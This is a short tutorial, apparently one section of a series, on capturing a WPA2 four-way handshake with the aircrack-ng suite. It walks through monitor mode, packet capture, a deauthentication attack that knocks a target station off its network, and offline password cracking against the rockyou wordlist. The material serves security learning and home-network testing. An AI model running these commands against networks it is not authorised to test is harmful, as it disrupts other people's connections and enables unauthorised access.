## Four-way handshake method

## Put wireless adapter in monitor mode
```
sudo airmon-ng check kill
sudo airmon-ng start wlx00c0caa763ed
```
  
## Start capturing packets  
```  
sudo airodump-ng wlan0mon
```

Ensure our target AP, identified in the top section with BSSID has at least one device connected to it. This device is a station, identified in the second section.
Lets start capturing the four-way handshake with airodump-ng.

```
sudo airodump-ng -c [CHANNEL_INT] --bssid [BSSID_TARGET_AP] -w /path/to/cap/file
```

However, for this to work we need a station to connect to the AP. We can wait for a new device to do so, if it does we will see that at the top row in the terminal with the airodump-ng application. But we can also bump of a currently connected station and force it to reconnect. Our target will be a station found with airodump-ng.

```
aireplay -0 200 -a [BSSID_TARGET_AP] -c [MAC_TARGET_STATION] wlan0mon
``` 

## EXTRA section
While brute-force cracking of the password using Hashcat is discussed in section 3 I have added a little sneak peek, just to show it can also be done with aircrack-ng. Ensure you have a wordlist, such as rockyou, downloaded and unzipped. If you are testing the four-way handshake method on your home wireless network you can add the password to the wordlist. 

```
echo 'HOME_PASSWORD' >> rockyou.txt
tail rockyou.txt 
sudo aircrack-ng [HOME_BSSID].cap-01.cap -w rockyou.txt
```

Aircrack will go through all the password, note that this is an offline attack. There is no need for the wireless adapter to be in Monitor mode or for any other airmon-ng suite applications to be running. If you have added the password correctly then aircrack-ng will give a warning at the end. 

## Resources
 - https://www.aircrack-ng.org/doku.php?id=deauthentication
 - https://www.shellvoide.com/wifi/how-to-crack-wpa2-password-without-handshake-newly-discovered-method/